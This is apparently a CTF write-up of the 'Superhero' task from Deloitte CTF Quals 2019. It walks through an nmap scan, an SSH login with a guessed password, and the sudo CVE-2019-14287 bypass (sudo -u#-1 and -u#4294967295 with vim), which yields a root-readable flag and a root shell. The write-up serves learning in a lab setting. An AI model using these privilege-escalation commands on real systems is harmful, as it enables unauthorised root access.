---
title: Deloitte CTF Quals 2019: Superhero
slug: deloitte-superhero
date: 06/11/2019 05
---

*Superhero* 🦸 was a task labelled infrastructure and worth 75 points. It is
a challenge that mostly revolves around [the recent `sudo` CVE](https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287).

![Task Description](/assets/superhero/intro.png)

Let's start with a quick nmap scan:

```
$ nmap 3.9.190.45
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 15:34 GMT
Nmap scan report for ec2-3-9-190-45.eu-west-2.compute.amazonaws.com (3.9.190.45)
  Host is up (0.0038s latency).
  Not shown: 990 closed ports
  PORT     STATE    SERVICE
  22/tcp   open     ssh
  25/tcp   filtered smtp
  53/tcp   filtered domain
  135/tcp  filtered msrpc
  139/tcp  filtered netbios-ssn
  445/tcp  filtered microsoft-ds
  2000/tcp open     cisco-sccp
  2222/tcp open     EtherNetIP-1
  5060/tcp open     sip
  8008/tcp open     http

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```

We notice something unusal: `EtherNetIP-1` on port `2222`. This is a fairly
popular SSH port. Let's try:

```
$ ssh -p2222 geo@3.9.190.45
###############################################################
  Bruce's SSH Server. Login as bruce with the usual password!
###############################################################
geo@3.9.190.45's password:
```

So we know that the user is `bruce`. From the name of the challenge, we can
imagine that it is a reference to Bruce Wayne, the real name of Batman! So
let's try `batman` as password:

```
$ ssh -p2222 bruce@3.9.190.45
###############################################################
    Bruce's SSH Server. Login as bruce with the usual password!
###############################################################
bruce@3.9.190.45's password:
bruce@eb2037c7a5a1:~$
```

Well, I guess that even a superhero might not be aware of the best practices
when it comes to passwords...

From there, we locate the `flag.txt` file, but we can't read it.

```
bruce@eb2037c7a5a1:~$ ls -al /
total 84
[...]
--w-------   1 root root   20 Oct 23 13:56 flag.txt
[...]
bruce@eb2037c7a5a1:~$
```

We need to get root permissions. Let's see if we can use `sudo`:

```
bruce@eb2037c7a5a1:/$ cat /etc/sudoers
bruce ALL = (ALL, !root) /usr/bin/vim
bruce@eb2037c7a5a1:/$
```

We can run `/usr/bin/vim`, but not as `root`:

```
bruce@eb2037c7a5a1:/$ sudo /usr/bin/vim /flag.txt
Sorry, user bruce is not allowed to execute '/usr/bin/vim /flag.txt' as root on eb2037c7a5a1.
bruce@eb2037c7a5a1:/$
```

At this point, one of my teammates told me that the recent sudo vulnerability
should work. I gave it a try:

```
bruce@eb2037c7a5a1:/$ sudo -u#-1 /usr/bin/vim /flag.txt
```

It worked! We got our flag! We can even use the `:terminal` command in Vim
and enjoy a root shell.

![Task Description](/assets/superhero/root.png)

For the record, the other `sudo` payload also worked:

```
bruce@eb2037c7a5a1:/$ sudo -u#4294967295 /usr/bin/vim /flag.txt
```
